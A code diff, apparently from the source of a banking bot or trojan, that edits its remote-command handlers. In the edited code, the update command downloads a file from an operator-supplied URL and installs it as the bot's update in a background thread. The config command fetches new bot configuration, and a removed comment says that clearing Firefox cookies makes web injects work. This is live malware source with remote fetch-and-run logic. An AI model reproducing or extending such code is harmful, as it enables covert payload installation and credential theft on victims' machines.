@@ -729,52 +729,45 @@ bool ExecuteDownload2(PTaskManager Manager, PCHAR Command, PCHAR Args)
 bool ExecuteUpdateConfig(PTaskManager, PCHAR Command, PCHAR Args)
 {
 	// Загрузить конфигурационный файл
-	if (Args == NULL)
-		return false;
-
 	#ifdef BotConfigH
-//		DeleteIECookies();
-
-		/* Очистка куков ФФ  вызывается для корректной работы инжектов в FireFox  */
-		#ifdef coocksolH
-				DeleteFFCookies();
-		#endif
-
 		return Config::Download(Args);
 	#else
 		return false;
 	#endif
 }
 
-bool ExecuteUpdate(PTaskManager, PCHAR Command, PCHAR Args)
+
+DWORD WINAPI DoExecuteUpdate(string *ArgsPtr)
 {
 	// Загрузить обновление
-	bool DeleteSettings = STRA::Hash(Args, 0, true) == 0x18766C /* all */;
+	string Args(*ArgsPtr);
+	delete ArgsPtr;
+	bool DeleteSettings = Args.Hash(0, true)  == 0x18766C /* all */;
 	#ifdef BOTPLUG
 		if( UpdateBotPlug() )
-		{
 			if (DeleteSettings) BOT::DeleteSettings();
-			return true;
-		}
-		return false;
 	#else
-		PCHAR FileName = File::GetTempNameA();
-		if (!FileName) return false;
+		string FileName = File::GetTempName2A();
+		if (FileName.IsEmpty()) return 0;
 
 		// Загружаем обновление
-		TBotFileStream File(FileName, fcmCreate);
+		TBotFileStream File(FileName.t_str(), fcmCreate);
 
 		THTTP HTTP;
-		bool Result = HTTP.Get(Args, &File);
+		bool Result = HTTP.Get(Args.t_str(), &File);
 
 		File.Close();
 
 		if (Result)
-			Result = BOT::MakeUpdate(FileName, DeleteSettings);
-
-		STR::Free(FileName);
-		return Result;
+			Result = BOT::MakeUpdate(FileName.t_str(), DeleteSettings);
 	#endif
+	return 0;
+}
+
+bool ExecuteUpdate(PTaskManager, PCHAR Command, PCHAR Args)
+{
+	StartThread(DoExecuteUpdate, new string(Args));
+	return true;
 }
 
 
